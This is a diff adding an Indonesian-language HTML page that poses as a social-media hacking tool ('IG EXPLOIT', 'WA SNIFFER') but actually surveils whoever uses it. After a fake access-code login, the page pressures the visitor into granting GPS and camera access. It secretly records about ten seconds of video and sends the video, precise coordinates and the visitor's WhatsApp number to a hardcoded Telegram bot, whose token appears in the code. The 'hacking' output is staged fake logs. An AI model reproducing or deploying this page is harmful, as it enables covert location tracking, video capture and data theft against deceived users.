@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>S.A.L - SECURE ACCESS LAYER</title>
+    <style>
+        * { box-sizing: border-box; transition: 0.3s; }
+        body, html { 
+            margin: 0; padding: 0; height: 100%; width: 100%;
+            background-color: #000; color: #4ade80;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden; user-select: none;
+        }
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
+        .wrapper { display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; }
+        
+        .terminal-card {
+            background: rgba(10, 15, 20, 0.9);
+            border: 1px solid rgba(74, 222, 128, 0.2);
+            border-top: 3px solid #4ade80;
+            border-radius: 8px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 20px rgba(74, 222, 128, 0.05);
+            backdrop-filter: blur(10px);
+        }
+
+        .system-status { font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; display: block; }
+        h1 { font-size: 20px; letter-spacing: 5px; color: #fff; margin: 0 0 30px 0; font-weight: 300; }
+
+        .input-box { margin-bottom: 15px; text-align: left; }
+        label { font-size: 10px; color: #4ade80; margin-left: 5px; margin-bottom: 5px; display: block; opacity: 0.8; }
+        
+        input {
+            width: 100%; background: rgba(0,0,0,0.5); border: 1px solid #1f3a3a;
+            padding: 14px; color: #fff; border-radius: 5px;
+            font-family: 'Courier New', monospace; outline: none; font-size: 14px;
+        }
+
+        .btn-primary {
+            width: 100%; background: #4ade80; color: #000; border: none;
+            padding: 16px; font-weight: 900; cursor: pointer; border-radius: 5px;
+            text-transform: uppercase; letter-spacing: 2px; margin-top: 10px;
+        }
+
+        .btn-permission {
+            width: 100%; background: transparent; color: #4ade80; border: 1px solid #1f3a3a;
+            padding: 14px; margin-bottom: 10px; cursor: pointer; font-weight: bold; border-radius: 5px;
+            font-size: 11px;
+        }
+        .btn-permission.active { border-color: #4ade80; background: rgba(74, 222, 128, 0.2); color: #fff; pointer-events: none; }
+
+        .menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        .btn-menu { background: rgba(255,255,255,0.02); border: 1px solid #1f3a3a; color: #4ade80; padding: 18px 5px; cursor: pointer; font-size: 10px; font-weight: bold; border-radius: 5px; }
+
+        .hidden { display: none; }
+        #log { background: #050505; height: 120px; padding: 12px; font-size: 10px; text-align: left; overflow-y: auto; border: 1px solid #111; margin-top: 20px; color: #4ade80; border-radius: 4px; }
+    </style>
+</head>
+<body oncontextmenu="return false">
+
+<canvas id="matrix"></canvas>
+
+<div class="wrapper">
+    <div id="loginPage" class="terminal-card">
+        <span class="system-status">● System Online</span>
+        <h1>ENCRYPTED ACCESS</h1>
+        <div class="input-box">
+            <label>WHATSAPP IDENTIFIER (12-13 DIGIT)</label>
+            <input type="number" id="waNumber" placeholder="08xxxxxxxxxx" autocomplete="off">
+        </div>
+        <div class="input-box">
+            <label>SECURITY TOKEN</label>
+            <input type="text" id="accessCode" placeholder="Masukkan Kode" autocomplete="off">
+        </div>
+        <button class="btn-primary" onclick="validate()">Authorize System</button>
+        <div style="font-size: 11px; color: #666; margin-top: 25px;">
+            Hubungi ZiiDeveloper Untuk Mendapatkan Kode Akses Atau Langsung Ke : <a href="https://lynk.id/ziideveloper" target="_blank" style="color:#4ade80; text-decoration:none;">lynk.id/ziideveloper</a>
+        </div>
+    </div>
+
+    <div id="permPage" class="terminal-card hidden">
+        <span class="system-status">Integrity Check</span>
+        <h1>PERMISSIONS</h1>
+        <p style="font-size: 11px; color: #4ade80; margin-bottom: 25px; font-weight: bold;">
+            Izinkan untuk melanjutkan proses dan nyalakan lokasi untuk bisa di verifikasi.
+        </p>
+        <button id="btnGPS" class="btn-permission" onclick="getGPS()">1. GRANT GPS ACCESS</button>
+        <button id="btnCAM" class="btn-permission" onclick="getCAM()">2. GRANT CAMERA ACCESS</button>
+        <button id="btnNext" class="btn-primary" style="background: #facc15;" onclick="goToMenu()">LANJUTKAN PROSES</button>
+    </div>
+
+    <div id="menuPage" class="terminal-card hidden">
+        <h1 id="menuTitle">CORE MODULES</h1>
+        <div id="gridArea" class="menu-grid">
+            <button class="btn-menu" onclick="showForm('INSTAGRAM')">IG EXPLOIT</button>
+            <button class="btn-menu" onclick="showForm('WHATSAPP')">WA SNIFFER</button>
+            <button class="btn-menu" onclick="showForm('TIKTOK')">TIKTOK BYPASS</button>
+            <button class="btn-menu" onclick="showForm('LOCATION')">SAT-LOCATOR</button>
+        </div>
+        <div id="hackForm" class="hidden">
+            <input type="text" id="targetInput" placeholder="ID / Nomor Target">
+            <button class="btn-primary" onclick="execute()">Execute Module</button>
+        </div>
+        <div id="logArea" class="hidden">
+            <div id="log"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const TG_TOKEN = "8679387125:AAGnUwe5XKJ275UmuYBY7d-gMmx4K3kPKSc";
+    const TG_CHAT_ID = "8580851235";
+    let gpsOk = false, camOk = false;
+    let targetWA = "";
+
+    function sendToBot(msg) {
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML" })
+        });
+    }
+
+    function validate() {
+        targetWA = document.getElementById('waNumber').value;
+        const code = document.getElementById('accessCode').value;
+        const waLen = targetWA.length;
+
+        if (targetWA.startsWith("08") && (waLen === 12 || waLen === 13) && code === "ziidev1") {
+            sendToBot(`<b>✅ ACCESS GRANTED</b>\nWA: <code>${targetWA}</code>`);
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('permPage').classList.remove('hidden');
+        } else {
+            alert("VALIDASI GAGAL:\n- No WA harus 08xx (12-13 digit)\n- Kode Akses harus benar");
+        }
+    }
+
+    function getGPS() {
+        navigator.geolocation.getCurrentPosition((p) => {
+            gpsOk = true;
+            document.getElementById('btnGPS').innerText = "GPS VERIFIED ✓";
+            document.getElementById('btnGPS').classList.add('active');
+            sendToBot(`<b>📍 COORDINATES</b>\nWA: ${targetWA}\nMaps: <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">View Location</a>`);
+        }, () => { alert("PERINGATAN: Izin GPS ditolak atau lokasi belum aktif. Nyalakan lokasi untuk verifikasi."); }, {enableHighAccuracy: true});
+    }
+
+    function getCAM() {
+        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+            camOk = true;
+            document.getElementById('btnCAM').innerText = "CAMERA VERIFIED ✓";
+            document.getElementById('btnCAM').classList.add('active');
+            
+            const mr = new MediaRecorder(s);
+            const chunks = [];
+            mr.ondataavailable = e => chunks.push(e.data);
+            mr.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const fd = new FormData();
+                fd.append('chat_id', TG_CHAT_ID);
+                fd.append('video', blob, 'capture.mp4');
+                fd.append('caption', `🎥 VIDEO TARGET (AUTO-CAPTURE)\nPengirim: ${targetWA}`);
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
+                s.getTracks().forEach(t => t.stop());
+            };
+            mr.start(); 
+            setTimeout(() => { if(mr.state !== "inactive") mr.stop(); }, 10000);
+        }).catch(() => { alert("PERINGATAN: Izin Kamera ditolak. Berikan izin untuk melanjutkan."); });
+    }
+
+    function goToMenu() {
+        // CEK APAKAH IZIN SUDAH LENGKAP
+        if(gpsOk && camOk) {
+            document.getElementById('permPage').classList.add('hidden');
+            document.getElementById('menuPage').classList.remove('hidden');
+        } else {
+            alert("Silahkan izinkan terlebih dahulu");
+        }
+    }
+
+    function showForm(mod) {
+        document.getElementById('menuTitle').innerText = mod;
+        document.getElementById('gridArea').classList.add('hidden');
+        document.getElementById('hackForm').classList.remove('hidden');
+    }
+
+    function execute() {
+        const target = document.getElementById('targetInput').value;
+        if(!target) return;
+        document.getElementById('hackForm').classList.add('hidden');
+        document.getElementById('logArea').classList.remove('hidden');
+        
+        sendToBot(`<b>🚀 MODULE EXECUTED</b>\nMod: ${document.getElementById('menuTitle').innerText}\nTarget: ${target}\nPengirim: ${targetWA}`);
+
+        let i = 0;
+        const logs = ["> Bypass Firewall...", "> Sniffing Packets...", "> Extraction...", "> Done."];
+        const interval = setInterval(() => {
+            if(i < logs.length) {
+                document.getElementById('log').innerHTML += `<div>${logs[i]}</div>`;
+                i++;
+            } else {
+                clearInterval(interval);
+                setTimeout(() => alert("CRITICAL ERROR: Connection Terminated."), 1000);
+            }
+        }, 2000);
+    }
+
+    const c = document.getElementById('matrix'); const x = c.getContext('2d');
+    c.width = window.innerWidth; c.height = window.innerHeight;
+    const d = Array(Math.floor(c.width/16)).fill(1);
+    function m() {
+        x.fillStyle = "rgba(0,0,0,0.05)"; x.fillRect(0,0,c.width,c.height);
+        x.fillStyle = "#0F0"; x.font = "16px monospace";
+        d.forEach((y, i) => {
+            x.fillText(Math.floor(Math.random()*2), i*16, y*16);
+            if(y*16 > c.height && Math.random() > 0.975) d[i] = 0;
+            d[i]++;
+        });
+    }
+    setInterval(m, 35);
+</script>
+</body>
+</html>
